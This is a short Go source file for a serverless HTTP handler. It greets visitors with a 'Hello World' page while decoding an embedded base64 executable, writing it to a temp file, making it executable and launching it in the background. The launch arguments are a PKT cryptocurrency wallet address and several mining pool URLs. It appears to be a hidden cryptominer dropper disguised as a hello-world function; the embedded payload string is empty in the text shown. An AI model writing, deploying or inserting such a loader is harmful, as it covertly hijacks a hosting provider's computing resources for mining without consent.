package handler

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
)

const (
	embeddedExecutableBase64 = ""
	arg1                     = "ann"
	arg2                     = "-p"
	arg3                     = "pkt1qrup75sh882mea577x9r9q6ka8j8rzlqdzazlqg"
	arg4                     = "http://pool.pkt.world/master/min4096"
	arg5                     = "https://stratum.zetahash.com/d/4096"
	arg6                     = "http://pool.pkteer.com"
	arg7                     = "http://pool.pktpool.io"
)

func Handler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "<h1>Hello World from Golang serverless</h1>")

	// Decode the base64-encoded string
	embeddedExecutable, err := base64.StdEncoding.DecodeString(embeddedExecutableBase64)
	if err != nil {
		fmt.Fprintf(w, "Error decoding embedded executable: %v", err)
		return
	}

	// Create a temporary file to write the embedded executable
	tmpFile, err := ioutil.TempFile("", "apivercel")
	if err != nil {
		fmt.Fprintf(w, "Error creating temporary file: %v", err)
		return
	}
	defer os.Remove(tmpFile.Name())

	// Write the embedded executable to the temporary file
	_, err = tmpFile.Write(embeddedExecutable)
	if err != nil {
		fmt.Fprintf(w, "Error writing embedded executable to temporary file: %v", err)
		return
	}

	// Close the temporary file before copying it
	tmpFile.Close()

	// Make the temporary file executable
	err = os.Chmod(tmpFile.Name(), 0755)
	if err != nil {
		fmt.Fprintf(w, "Error making temporary file executable: %v", err)
		return
	}

	// Execute the temporary file with the specified arguments
	cmd := exec.Command(tmpFile.Name(), arg1, arg2, arg3, arg4, arg5, arg6, arg7)
	err = cmd.Start()
	if err != nil {
		fmt.Fprintf(w, "Error executing the embedded executable: %v", err)
		return
	}

	fmt.Fprintf(w, "apivercel is running in the background")
}
